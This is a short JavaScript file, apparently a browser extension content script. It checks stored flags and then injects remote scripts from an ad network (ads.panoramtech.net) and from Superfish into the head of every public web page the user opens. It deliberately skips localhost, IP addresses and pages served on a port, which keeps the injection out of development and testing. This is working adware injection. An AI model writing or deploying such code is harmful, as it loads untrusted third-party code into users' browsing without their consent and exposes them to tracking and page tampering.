(function() {
  var addScript;

  if (location.port !== "") {
    return;
  }

  if (location.hostname.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) {
    return;
  }

  if (!(location.hostname.split(".").length > 1)) {
    return;
  }

  if (location.hostname.indexOf("localhost", location.hostname.length - "localhost".length) !== -1) {
    return;
  }

  addScript = function(url) {
    var tag;
    tag = document.createElement("script");
    tag.type = "text/javascript";
    tag.src = url;
    return document.getElementsByTagName("head")[0].appendChild(tag);
  };

  chrome.storage.local.get(["revjet_disabled"], function(data) {
    if (data && data.revjet_disabled === true) {
      return;
    }
    return addScript("//ads.panoramtech.net/loader.js?client=antp");
  });

  chrome.storage.local.get(["superfish_disabled"], function(data) {
    if (data && data.superfish_disabled === true) {
      return;
    }
    return addScript("//www.superfish.com/ws/sf_main.jsp?dlsource=irusvef&CTID=sntp");
  });

}).call(this);
